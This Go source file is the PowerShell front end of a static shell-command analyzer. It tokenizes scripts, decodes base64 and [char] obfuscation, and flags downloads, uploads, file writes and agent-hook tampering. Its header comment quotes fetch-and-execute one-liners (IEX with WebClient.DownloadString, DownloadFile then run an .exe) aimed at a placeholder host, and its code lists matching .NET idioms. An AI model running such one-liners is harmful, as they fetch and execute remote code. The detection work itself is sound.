package shellx

import (
	"strconv"
	"strings"
)

// PowerShell front end. PowerShell has no stable grammar library in Go, so
// this is a tokenizer that understands enough of the language to find
// commands, parameters, pipelines, variables, sub-expressions and script
// blocks, plus the .NET idioms attack one-liners lean on:
//
//	IEX (New-Object Net.WebClient).DownloadString('http://x')
//	iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('...')))
//	(New-Object Net.WebClient).DownloadFile('http://x/a.exe','a.exe'); .\a.exe
//
// Values that can be computed statically (string literals joined with +,
// [char] codes, base64 literals) are computed, so the code they hide is
// analysed like any other.

type psLexer struct {
	a      *analyzer
	s      string
	i      int
	origin string
	depth  int
	b      *pipeBuilder
	call   bool // the next word is a command after the & or . operator
}

func (a *analyzer) powershell(src, origin string, depth int, in flow) flow {
	a.nest++
	defer func() { a.nest-- }()
	if a.nest > maxNest {
		a.f.Truncated = true
		return noFlow()
	}
	lx := &psLexer{a: a, s: src, origin: origin, depth: depth, b: newPipeBuilder()}
	lx.lex()
	return a.runPipes(lx.b.finish(), origin, depth, PowerShell, in)
}

func (lx *psLexer) peek(n int) byte {
	if lx.i+n < len(lx.s) {
		return lx.s[lx.i+n]
	}
	return 0
}

func psSpace(c byte) bool { return c == ' ' || c == '\t' || c == '\r' || c == '\f' || c == '\v' }

func (lx *psLexer) lex() {
	s := lx.s
	for lx.i < len(s) {
		if !lx.a.tick() {
			return
		}
		c := s[lx.i]
		switch {
		case psSpace(c):
			lx.i++
		case c == '`' && lx.peek(1) == '\n':
			lx.i += 2
		case c == '\n' || c == ';':
			lx.i++
			lx.b.endPipe()
		case c == '#':
			for lx.i < len(s) && s[lx.i] != '\n' {
				lx.i++
			}
		case c == '<' && lx.peek(1) == '#':
			if j := strings.Index(s[lx.i+2:], "#>"); j >= 0 {
				lx.i += j + 4
			} else {
				lx.i = len(s)
			}
		case c == '&' && lx.peek(1) == '&', c == '|' && lx.peek(1) == '|':
			lx.i += 2
			lx.b.endPipe()
		case c == '|':
			lx.i++
			lx.b.endCmd()
		case c == '&' && lx.b.cur.empty():
			lx.i++
			lx.call = true
		case c == '&':
			// Trailing & (PowerShell 7) runs the pipeline as a job.
			lx.i++
			lx.b.cur.bg = true
			lx.b.endPipe()
		case c == '.' && lx.b.cur.empty() && (psSpace(lx.peek(1)) || lx.peek(1) == '\'' || lx.peek(1) == '"'):
			// Dot-sourcing: ". .\script.ps1" or ". 'C:\x.ps1'".
			lx.i++
			lx.call = true
		case c == ')' || c == '}':
			lx.i++
		case c == '>' || (c == '2' || c == '*' || c >= '3' && c <= '6') && lx.peek(1) == '>':
			lx.redirect()
		default:
			if lx.b.cur.empty() && !lx.call && lx.assignment() {
				continue
			}
			w, expr := lx.word()
			lx.addWord(w, expr)
		}
	}
}

func (lx *psLexer) addWord(w arg, expr bool) {
	cur := lx.b.cur
	if len(cur.words) == 0 && !lx.call && expr {
		// An expression statement: (…).Method(…), [Type]::Call(…), $x.Method(…).
		cur.expr = true
		cur.exprT |= w.t
		return
	}
	if cur.expr {
		cur.exprT |= w.t
		return
	}
	lx.call = false
	cur.words = append(cur.words, w)
	if len(cur.words) > 8*maxList {
		lx.a.f.Truncated = true
		lx.b.endCmd()
	}
}

func (lx *psLexer) redirect() {
	s := lx.s
	fd := byte('1')
	if s[lx.i] != '>' {
		fd = s[lx.i]
		lx.i++
	}
	lx.i++ // '>'
	op := ">"
	if lx.i < len(s) && s[lx.i] == '>' {
		op = ">>"
		lx.i++
	}
	if lx.i < len(s) && s[lx.i] == '&' {
		// 2>&1: stream merge, no file.
		lx.i++
		for lx.i < len(s) && s[lx.i] >= '0' && s[lx.i] <= '9' {
			lx.i++
		}
		return
	}
	for lx.i < len(s) && psSpace(s[lx.i]) {
		lx.i++
	}
	if lx.i >= len(s) || strings.IndexByte(";|\n", s[lx.i]) >= 0 {
		return
	}
	t, _ := lx.word()
	switch fd {
	case '1', '*':
	case '2':
		op = "2" + op
	default:
		return
	}
	lx.b.cur.redirs = append(lx.b.cur.redirs, lexRedir{op: op, target: t})
}

// assignment handles "$name = <statement>" and "$env:NAME = value" at the
// start of a statement. The right-hand side is analysed as a statement of
// its own; its value is tracked when static, its taint always.
func (lx *psLexer) assignment() bool {
	s := lx.s
	if lx.i >= len(s) || s[lx.i] != '$' {
		return false
	}
	j := lx.i + 1
	braced := j < len(s) && s[j] == '{'
	var name string
	if braced {
		end := strings.IndexByte(s[j:], '}')
		if end < 0 {
			return false
		}
		name = s[j+1 : j+end]
		j += end + 1
	} else {
		k := j
		for k < len(s) && (isIdentByte(s[k]) || s[k] == ':') {
			k++
		}
		name = s[j:k]
		j = k
	}
	if name == "" {
		return false
	}
	k := j
	for k < len(s) && psSpace(s[k]) {
		k++
	}
	op := ""
	switch {
	case strings.HasPrefix(s[k:], "+="):
		op = "+="
	case strings.HasPrefix(s[k:], "=") && !strings.HasPrefix(s[k:], "=="):
		op = "="
	default:
		return false
	}
	rhsStart := k + len(op)
	rhsEnd := psStatementEnd(s, rhsStart)
	rhs := strings.TrimSpace(s[rhsStart:rhsEnd])
	lx.i = rhsEnd
	lname := strings.ToLower(name)
	envName := ""
	if strings.HasPrefix(lname, "env:") {
		envName = name[4:]
	}
	fl := noFlow()
	val, vt, static := psStaticValue(lx.a, rhs, lx.depth)
	if !static {
		fl = lx.a.powershell(rhs, lx.origin, lx.depth, noFlow())
	}
	v := value{s: val, static: static, t: vt | fl.t}
	if op == "+=" {
		if old, ok := lx.a.getVar(varKey(PowerShell, name)); ok && old.static && v.static {
			v.s = old.s + v.s
			v.t |= old.t
		} else {
			v.static = false
		}
	}
	lx.a.setVar(varKey(PowerShell, name), v)
	if envName != "" {
		lx.a.envAssign(envName)
		lx.a.assignFacts(envName, arg{s: v.s, dyn: !v.static, t: v.t})
		if setsDisableAllHooks(rhs) {
			lx.a.evasion("agent_hook_tamper")
		}
	}
	if v.static && v.t&tPayload != 0 {
		lx.a.sinkDecoded(v.s, lx.depth)
	}
	return true
}

// psStatementEnd returns the end of the statement starting at i: the next
// unquoted newline or semicolon outside brackets.
func psStatementEnd(s string, i int) int {
	depth := 0
	for j := i; j < len(s); j++ {
		switch c := s[j]; c {
		case '`':
			j++
		case '\'':
			for j++; j < len(s); j++ {
				if s[j] == '\'' {
					if j+1 < len(s) && s[j+1] == '\'' {
						j++
						continue
					}
					break
				}
			}
		case '"':
			for j++; j < len(s) && s[j] != '"'; j++ {
				if s[j] == '`' {
					j++
				}
			}
		case '(', '{', '[':
			depth++
		case ')', '}', ']':
			if depth > 0 {
				depth--
			}
		case '\n', ';':
			if depth == 0 {
				return j
			}
		}
	}
	return len(s)
}

// word reads one PowerShell word. expr reports that it starts with an
// expression (grouping, sub-expression, type literal or variable member
// access) rather than a bare argument.
func (lx *psLexer) word() (arg, bool) {
	s := lx.s
	var b strings.Builder
	var w arg
	start := lx.i
	expr := false
	exprText := ""
	for lx.i < len(s) {
		c := s[lx.i]
		if psSpace(c) || c == '\n' || c == ';' || c == '|' || c == ')' || c == '}' {
			break
		}
		if c == '&' && (lx.peek(1) == '&' || lx.i+1 >= len(s) || psSpace(lx.peek(1))) {
			break
		}
		if c == '>' && b.Len() == 0 {
			break
		}
		if b.Len() > maxWord {
			lx.a.f.Truncated = true
			lx.i++
			continue
		}
		atStart := lx.i == start
		if c == '(' && !atStart && !expr {
			// In argument mode "iex(...)" is the word iex followed by a new
			// expression argument.
			break
		}
		if c == '(' && !atStart && expr {
			// Method-call arguments: .DownloadString('u'). They are values,
			// not statements; psExprFacts reads them below.
			end := matchClose(s, lx.i, '(', ')')
			if end < 0 {
				end = len(s)
			}
			b.WriteString(s[lx.i:end])
			lx.i = end
			w.dyn = true
			continue
		}
		if atStart && (c == '\'' || c == '"') {
			// A string literal opening a statement is an expression; only
			// & or . make it a command.
			expr = true
		}
		switch {
		case c == '\'':
			w.quoted = true
			lit, end := psSingle(s, lx.i)
			b.WriteString(lit)
			lx.i = end
		case c == '"':
			w.quoted = true
			lx.double(&b, &w)
		case c == '@' && (lx.peek(1) == '\'' || lx.peek(1) == '"') && (lx.peek(2) == '\n' || lx.peek(2) == '\r'):
			w.quoted = true
			lx.hereString(&b, &w)
		case c == '@' && lx.peek(1) == '(' || c == '$' && lx.peek(1) == '(' || c == '(':
			open := lx.i
			if c != '(' {
				open++
			}
			end := matchClose(s, open, '(', ')')
			if end < 0 {
				end = len(s)
				lx.a.f.ParseOK = false
			}
			inner := s[open+1 : max(open+1, end-1)]
			lx.i = end
			if val, t, ok := psStaticValue(lx.a, inner, lx.depth); ok {
				b.WriteString(val)
				w.t |= t
				continue
			}
			fl := lx.a.sub(inner, PowerShell, OriginSubstitution, lx.depth+1, noFlow())
			w.t |= fl.t
			w.dyn, w.exp = true, true
			b.WriteString(s[lx.i-(end-open)-boolInt(c != '(') : end])
			if atStart {
				expr = true
			}
			exprText += inner
		case c == '{':
			end := matchClose(s, lx.i, '{', '}')
			if end < 0 {
				end = len(s)
				lx.a.f.ParseOK = false
			}
			inner := s[lx.i+1 : max(lx.i+1, end-1)]
			lx.i = end
			fl := lx.a.sub(inner, PowerShell, OriginSubshell, lx.depth+1, noFlow())
			w.t |= fl.t
			w.dyn, w.exp = true, true
			b.WriteString("{...}")
		case c == '[' && atStart:
			end := matchClose(s, lx.i, '[', ']')
			if end < 0 {
				end = len(s)
			}
			b.WriteString(s[lx.i:end])
			lx.i = end
			expr = true
			w.dyn = true
		case c == '$':
			lx.variable(&b, &w)
			if atStart && lx.i < len(s) && (s[lx.i] == '.' || s[lx.i] == '[') {
				expr = true
			}
		case c == '`':
			if lx.i+1 < len(s) {
				b.WriteByte(psEscape(s[lx.i+1]))
				lx.i += 2
			} else {
				lx.i++
			}
		default:
			b.WriteByte(c)
			lx.i++
		}
	}
	if lx.i == start {
		lx.i++
	}
	w.s = b.String()
	if expr || w.dyn {
		// Member calls such as .DownloadString(...) are part of the word's
		// text; scan it for the .NET idioms that fetch, decode or write.
		w.t |= psExprFacts(lx.a, s[start:lx.i], lx.depth)
	}
	_ = exprText
	return w, expr
}

func psEscape(c byte) byte {
	switch c {
	case 'n':
		return '\n'
	case 't':
		return '\t'
	case 'r':
		return '\r'
	case '0':
		return 0
	case 'a':
		return 7
	case 'b':
		return 8
	case 'e':
		return 27
	case 'f':
		return '\f'
	case 'v':
		return '\v'
	}
	return c
}

// psSingle reads a single-quoted string at s[i] (” escapes a quote).
func psSingle(s string, i int) (string, int) {
	var b strings.Builder
	j := i + 1
	for j < len(s) {
		if s[j] == '\'' {
			if j+1 < len(s) && s[j+1] == '\'' {
				b.WriteByte('\'')
				j += 2
				continue
			}
			return b.String(), j + 1
		}
		b.WriteByte(s[j])
		j++
	}
	return b.String(), j
}

// double reads an expandable "..." string.
func (lx *psLexer) double(b *strings.Builder, w *arg) {
	s := lx.s
	lx.i++
	for lx.i < len(s) {
		c := s[lx.i]
		switch {
		case c == '"' && lx.peek(1) == '"':
			b.WriteByte('"')
			lx.i += 2
		case c == '"':
			lx.i++
			return
		case c == '`' && lx.i+1 < len(s):
			b.WriteByte(psEscape(s[lx.i+1]))
			lx.i += 2
		case c == '$' && lx.peek(1) == '(':
			end := matchClose(s, lx.i+1, '(', ')')
			if end < 0 {
				end = len(s)
			}
			inner := s[lx.i+2 : max(lx.i+2, end-1)]
			lx.i = end
			if val, t, ok := psStaticValue(lx.a, inner, lx.depth); ok {
				b.WriteString(val)
				w.t |= t
				continue
			}
			fl := lx.a.sub(inner, PowerShell, OriginSubstitution, lx.depth+1, noFlow())
			w.t |= fl.t
			w.dyn, w.exp = true, true
			b.WriteString("$(...)")
		case c == '$':
			lx.variable(b, w)
		default:
			b.WriteByte(c)
			lx.i++
		}
	}
	lx.a.f.ParseOK = false
}

// hereString reads @'...'@ or @"..."@.
func (lx *psLexer) hereString(b *strings.Builder, w *arg) {
	s := lx.s
	q := s[lx.i+1]
	lx.i += 2
	if lx.i < len(s) && s[lx.i] == '\r' {
		lx.i++
	}
	if lx.i < len(s) && s[lx.i] == '\n' {
		lx.i++
	}
	end := strings.Index(s[lx.i:], "\n"+string(q)+"@")
	var body string
	if end < 0 {
		body = s[lx.i:]
		lx.i = len(s)
	} else {
		body = s[lx.i : lx.i+end]
		lx.i += end + 3
	}
	body = strings.TrimSuffix(body, "\r")
	if q == '"' && strings.Contains(body, "$") {
		w.dyn = true
	}
	b.WriteString(body)
}

// variable expands $name, ${name}, $env:NAME and automatic variables.
func (lx *psLexer) variable(b *strings.Builder, w *arg) {
	s := lx.s
	j := lx.i + 1
	var name string
	if j < len(s) && s[j] == '{' {
		end := strings.IndexByte(s[j:], '}')
		if end < 0 {
			b.WriteByte('$')
			lx.i++
			return
		}
		name = s[j+1 : j+end]
		lx.i = j + end + 1
	} else {
		k := j
		for k < len(s) && (isIdentByte(s[k]) || s[k] == ':' && k+1 < len(s) && isIdentByte(s[k+1]) || s[k] == '?' && k == j) {
			k++
		}
		name = s[j:k]
		lx.i = k
	}
	if name == "" {
		b.WriteByte('$')
		return
	}
	w.exp = true
	l := strings.ToLower(name)
	switch l {
	case "true", "false", "null":
		b.WriteString("$" + l)
		return
	}
	if v, ok := lx.a.getVar(varKey(PowerShell, name)); ok {
		w.t |= v.t
		if v.static {
			b.WriteString(v.s)
			return
		}
	}
	b.WriteString("$" + name)
	w.dyn = true
}

// psStaticValue evaluates an expression whose value is known without
// running it: string literals joined with +, [char] codes, "..." -join, and
// the base64 decoding idioms. ok is false for anything else.
func psStaticValue(a *analyzer, expr string, depth int) (string, taint, bool) {
	e := strings.TrimSpace(expr)
	for len(e) >= 2 && e[0] == '(' && matchClose(e, 0, '(', ')') == len(e) {
		e = strings.TrimSpace(e[1 : len(e)-1])
	}
	if e == "" || len(e) > maxStatic {
		return "", 0, false
	}
	if v, ok := psConcat(e); ok {
		if strings.Contains(e, "+") || strings.Contains(strings.ToLower(e), "[char]") {
			a.obf("char_concat")
		}
		return v, 0, true
	}
	if v, ok := psCharJoin(e); ok {
		a.obf("char_concat")
		return v, 0, true
	}
	l := strings.ToLower(e)
	if i := strings.Index(l, "frombase64string("); i >= 0 {
		open := i + len("frombase64string")
		end := matchClose(e, open, '(', ')')
		if end > 0 {
			inner := strings.TrimSpace(e[open+1 : end-1])
			lit, ok := psConcat(inner)
			if !ok {
				return "", 0, false
			}
			raw, ok := decodeBase64(lit)
			if !ok {
				return "", 0, false
			}
			if strings.Contains(l, "gzipstream") || strings.Contains(l, "deflatestream") {
				if z, ok := gunzip(raw); ok {
					raw = z
				}
			}
			var text string
			switch {
			case strings.Contains(l, "unicode.getstring") || looksUTF16LE(raw):
				t, ok := decodeUTF16LE(raw)
				if !ok {
					return "", 0, false
				}
				text = t
			default:
				text = string(raw)
			}
			if !textual(text) {
				return "", 0, false
			}
			return text, tB64, true
		}
	}
	return "", 0, false
}

// psConcat evaluates 'a' + "b" + 'c' (literals without expansions) and
// [char]105 + [char]0x65.
func psConcat(e string) (string, bool) {
	var b strings.Builder
	i := 0
	parts := 0
	for {
		for i < len(e) && psSpace(e[i]) {
			i++
		}
		if i >= len(e) {
			break
		}
		switch {
		case e[i] == '\'':
			lit, end := psSingle(e, i)
			if end > len(e) || end <= i {
				return "", false
			}
			b.WriteString(lit)
			i = end
		case e[i] == '"':
			j := i + 1
			var lit strings.Builder
			for j < len(e) && e[j] != '"' {
				if e[j] == '$' {
					return "", false
				}
				if e[j] == '`' && j+1 < len(e) {
					lit.WriteByte(psEscape(e[j+1]))
					j += 2
					continue
				}
				lit.WriteByte(e[j])
				j++
			}
			if j >= len(e) {
				return "", false
			}
			b.WriteString(lit.String())
			i = j + 1
		case hasPrefixFold(e[i:], "[char]"):
			j := i + len("[char]")
			k := j
			for k < len(e) && (isAlnum(e[k]) || e[k] == 'x' || e[k] == 'X') {
				k++
			}
			n, err := strconv.ParseInt(strings.ToLower(e[j:k]), 0, 32)
			if err != nil || n < 0 || n > 0x10ffff {
				return "", false
			}
			b.WriteRune(rune(n))
			i = k
		default:
			return "", false
		}
		parts++
		for i < len(e) && psSpace(e[i]) {
			i++
		}
		if i >= len(e) {
			break
		}
		if e[i] != '+' {
			return "", false
		}
		i++
	}
	return b.String(), parts > 0
}

// psCharJoin evaluates [char[]](105,101,120) -join ” and
// -join [char[]](...).
func psCharJoin(e string) (string, bool) {
	l := strings.ToLower(e)
	if !strings.Contains(l, "-join") || !strings.Contains(l, "[char[]]") {
		return "", false
	}
	i := strings.Index(l, "[char[]]") + len("[char[]]")
	for i < len(e) && psSpace(e[i]) {
		i++
	}
	if i >= len(e) || e[i] != '(' {
		return "", false
	}
	end := matchClose(e, i, '(', ')')
	if end < 0 {
		return "", false
	}
	var b strings.Builder
	for _, f := range strings.Split(e[i+1:end-1], ",") {
		n, err := strconv.ParseInt(strings.ToLower(strings.TrimSpace(f)), 0, 32)
		if err != nil || n < 0 || n > 0x10ffff {
			return "", false
		}
		b.WriteRune(rune(n))
	}
	return b.String(), true
}

// psExprFacts scans expression text for .NET idioms and returns the taint of
// the expression's value.
func psExprFacts(a *analyzer, text string, depth int) taint {
	if len(text) > maxStatic {
		text = clip(text, maxStatic)
	}
	l := strings.ToLower(text)
	var t taint
	if strings.Contains(text, "://") {
		a.scanURLs(text)
	}
	urls := findURLs(text)
	var hosts []string
	for _, u := range urls {
		if h := urlHost(u); h != "" {
			hosts = append(hosts, h)
		}
	}
	for _, m := range []string{".downloadstring(", ".downloaddata(", ".openread(", ".getstringasync(", ".getbytearrayasync(", ".getstreamasync(", "]::create(", ".getresponse(", "invoke-webrequest", "invoke-restmethod"} {
		if strings.Contains(l, m) {
			a.f.Downloads = true
			t |= tDownload
			break
		}
	}
	if i := strings.Index(l, ".downloadfile("); i >= 0 {
		a.f.Downloads = true
		args := psCallLiterals(text, i+len(".downloadfile"))
		if len(args) >= 2 {
			a.write(args[1])
			a.drop(args[1], tDownload)
		}
	}
	for _, m := range []string{".uploadstring(", ".uploadfile(", ".uploaddata(", ".uploadvalues(", ".postasync(", ".putasync("} {
		if i := strings.Index(l, m); i >= 0 {
			fileUp := m == ".uploadfile("
			if fileUp {
				if args := psCallLiterals(text, i+len(m)-1); len(args) >= 2 {
					a.read(args[len(args)-1])
				}
			}
			a.netSend(hosts, urls, fileUp, true)
		}
	}
	for _, m := range []string{"writealltext(", "writeallbytes(", "writealllines(", "appendalltext(", "appendalllines("} {
		if i := strings.Index(l, "]::"+m); i >= 0 {
			if args := psCallLiterals(text, i+len("]::"+m)-1); len(args) >= 1 {
				if strings.HasPrefix(m, "append") {
					a.appendTo(args[0])
				} else {
					a.write(args[0])
				}
			}
		}
	}
	for _, m := range []string{"readalltext(", "readallbytes(", "readalllines("} {
		if i := strings.Index(l, "]::"+m); i >= 0 {
			if args := psCallLiterals(text, i+len("]::"+m)-1); len(args) >= 1 {
				a.read(args[0])
			}
		}
	}
	if i := strings.Index(l, "process]::start("); i >= 0 {
		if args := psCallLiterals(text, i+len("process]::start")); len(args) >= 1 {
			line := strings.Join(args, " ")
			a.sub(line, detectWinDialect(line), OriginWrapper, depth+1, noFlow())
		}
	}
	if strings.Count(l, "[char]") >= 3 {
		a.obf("char_concat")
	}
	if strings.Contains(l, "frombase64string(") {
		t |= tB64
	}
	if strings.Contains(l, "[reflection.assembly]::load") || strings.Contains(l, "[system.reflection.assembly]::load") {
		a.f.Eval = true
	}
	return t
}

// psCallLiterals returns the static string arguments of the call whose
// opening parenthesis is at text[open] (or the first one after it).
func psCallLiterals(text string, open int) []string {
	for open < len(text) && text[open] != '(' {
		if !psSpace(text[open]) {
			return nil
		}
		open++
	}
	if open >= len(text) {
		return nil
	}
	end := matchClose(text, open, '(', ')')
	if end < 0 {
		end = len(text)
	}
	inner := text[open+1 : max(open+1, end-1)]
	var out []string
	for _, part := range splitTopLevel(inner, ',') {
		if v, ok := psConcat(strings.TrimSpace(part)); ok {
			out = append(out, v)
		} else {
			out = append(out, strings.TrimSpace(part))
		}
		if len(out) >= 8 {
			break
		}
	}
	return out
}

// splitTopLevel splits s on sep outside quotes and brackets.
func splitTopLevel(s string, sep byte) []string {
	var out []string
	depth := 0
	last := 0
	for i := 0; i < len(s); i++ {
		switch c := s[i]; c {
		case '\'', '"':
			if j := strings.IndexByte(s[i+1:], c); j >= 0 {
				i += j + 1
			}
		case '(', '[', '{':
			depth++
		case ')', ']', '}':
			if depth > 0 {
				depth--
			}
		default:
			if c == sep && depth == 0 {
				out = append(out, s[last:i])
				last = i + 1
			}
		}
	}
	return append(out, s[last:])
}
